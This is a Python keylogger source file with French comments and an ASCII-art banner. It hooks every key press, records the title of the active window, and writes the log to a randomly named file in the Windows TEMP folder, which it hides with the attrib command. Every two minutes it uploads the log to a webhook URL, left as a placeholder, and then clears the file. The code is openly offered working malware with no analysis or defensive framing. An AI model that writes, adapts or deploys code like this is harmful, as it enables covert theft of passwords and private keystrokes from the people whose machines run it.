#         ,-.-.                       .=-.-.         ,-.--, 
#,-..-.-./  \==\  _..---.    _.-.    /==/_ /.--.-.  /=/, .' 
#|, \=/\=|- |==|.' .'.-. \ .-,.'|   |==|, | \==\ -\/=/- /   
#|- |/ |/ , /==/==/- '=' /|==|, |   |==|  |  \==\ -' ,/    
# \, ,     _|==|==|-,   ' |==|- |   |==|- |   |==|,  - |    
# | -  -  , |==|==|  .=. \|==|, |   |==| ,|  /==/   ,   \   
#  \  ,  - /==//==/- '=' ,|==|- -._|==|- | /==/, .--, - \  
#  |-  /\ /==/|==|   -   //==/ - , ,/==/. / \==\- \/=/ , /  
#  --  -- -._.___,' -------'---   ---'  --   

import keyboard
import os
import time
import requests
from datetime import datetime
import random
import string
import pygetwindow as gw  

webhook_url = 'YOUR_WEBHOOK'
last_sent_time = 0  

COOLDOWN_TIME = 120  

def generate_random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + ".txt"

temp_dir = os.getenv('TEMP')

# nnom randome
log_file = os.path.join(temp_dir, generate_random_filename())

def get_active_window_title():
    """Obtenir le titre de la fenêtre active."""
    try:
        active_window = gw.getActiveWindow()  
        if active_window:
            return active_window.title  
        else:
            return "Fenetre inconnue" 
    except Exception as e:
        return "Fenetre inconnue" 

def on_key_press(event):
    """Log chaque pression de touche dans le fichier."""
    active_window = get_active_window_title()  
    with open(log_file, 'a') as f:
        f.write(f'{event.name} in window: {active_window}\n')

keyboard.on_press(on_key_press)

def send_log_file():
    global last_sent_time
    now = datetime.now()
    formatted_time = now.strftime("%H:%M")  


    if not os.path.exists(log_file):
        print(f"{log_file} fichier pas trouver, creation...")
        with open(log_file, 'w'): pass  

    with open(log_file, 'rb') as f:
        files = {
            'file': (log_file, f)
        }
        data = {
            'content': f'{formatted_time} Keylogger log file:',  
            'username': 'KeyloggerBot'  
        }
        
        response = requests.post(webhook_url, data=data, files=files)
        if response.status_code == 200:
            print("fichier envoyer !")
        else:
            print(f"Erreur a l'envoie: {response.status_code}")
    
    os.remove(log_file)
    with open(log_file, 'w'): pass
    last_sent_time = time.time()

def check_and_send_log():
    global last_sent_time
    current_time = time.time()
    if current_time - last_sent_time >= COOLDOWN_TIME:
        send_log_file()
    else:
        print(f"Prochaine envoie dans : {int(COOLDOWN_TIME - (current_time - last_sent_time))} secondes.")

os.system(f'attrib +h "{log_file}"')

try:
    print("Ctrl + c pour quitt er.")
    
    while True:
        check_and_send_log() 
        time.sleep(10)  

except KeyboardInterrupt:
    print('Sortie du keylogger.')
    send_log_file()  
    os.remove(log_file)
